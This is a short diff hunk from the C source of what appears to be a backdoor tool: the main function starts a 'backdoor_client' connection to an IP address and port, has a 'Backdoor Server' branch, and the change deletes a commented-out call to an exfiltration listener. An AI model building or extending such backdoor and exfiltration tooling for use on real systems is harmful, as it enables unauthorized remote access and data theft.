@@ -97,8 +97,6 @@ int main(int argc, char *argv[])
 	{
 		// Start command entry
 		backdoor_client(ipaddr, port, duplex);
-		// Start exfil listener
-		//exfil_listen(ipaddr);
 	}
 	else // Backdoor Server
 	{
